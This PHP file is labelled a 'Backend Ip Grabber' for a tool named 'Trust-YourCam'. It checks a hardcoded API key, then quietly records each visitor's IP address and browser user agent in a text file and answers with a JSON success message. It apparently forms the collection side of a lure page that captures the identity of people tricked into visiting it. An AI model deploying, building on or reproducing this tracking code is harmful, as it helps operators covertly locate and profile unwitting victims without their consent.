<?php
/*
	@property => ViewTech
	@Tipe     => Backend Ip Grabber
	@Tools    => Trust-YourCam
*/

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(404);
    exit;
}

if (($_SERVER['HTTP_X_API_KEY'] ?? '') !== 'CCcUgEaDxCnRqWlYmINY') {
    http_response_code(403);
    exit;
}

header('Content-Type: application/json');
header('Cache-Control: no-store');

function valid_ip($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP);
}

$ip = 'UNKNOWN';

if (!empty($_SERVER['HTTP_X_REAL_IP']) && valid_ip($_SERVER['HTTP_X_REAL_IP'])) {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = trim($ips[0]);
    if (!valid_ip($ip)) $ip = 'UNKNOWN';
} elseif (valid_ip($_SERVER['REMOTE_ADDR'] ?? '')) {
    $ip = $_SERVER['REMOTE_ADDR'];
}

file_put_contents(
    __DIR__.'/../ip.txt',
    "IP: $ip\r\nUser-Agent: ".($_SERVER['HTTP_USER_AGENT'] ?? 'NONE')."\r\n\r\n",
    FILE_APPEND | LOCK_EX
);

echo json_encode(['ok' => true]);
